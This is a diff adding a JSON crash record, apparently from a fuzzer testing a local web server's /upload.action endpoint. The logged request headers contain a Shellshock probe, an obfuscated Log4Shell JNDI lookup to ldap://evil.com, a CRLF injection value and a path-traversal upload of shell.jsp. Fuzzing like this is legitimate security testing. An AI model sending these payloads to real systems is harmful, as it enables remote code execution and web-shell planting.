@@ -1,0 +1,25 @@
+{
+  "timestamp": "2025-12-29T14:42:14.560617",
+  "crash_type": "segfault",
+  "payload": "DELETE /upload.action?\nHeaders: {'User-Agent': '() { :; }; echo vulnerable', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Forwarded-For': '${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}', 'X-Original-Url': '%0d%0a', 'Content-Disposition': 'form-data; name=\"upload\"; filename=\"../../../shell.jsp\"', 'Content-Type': 'multipart/form-data', 'Content-Length': '0'}",
+  "payload_hash": "c4e2e6e6ebe2b74c",
+  "request_method": "DELETE",
+  "request_path": "/upload.action?",
+  "request_headers": {
+    "User-Agent": "() { :; }; echo vulnerable",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Forwarded-For": "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",
+    "X-Original-Url": "%0d%0a",
+    "Content-Disposition": "form-data; name=\"upload\"; filename=\"../../../shell.jsp\"",
+    "Content-Type": "multipart/form-data",
+    "Content-Length": "0"
+  },
+  "request_body": "",
+  "error_message": "Simulated segfault",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 321
+}
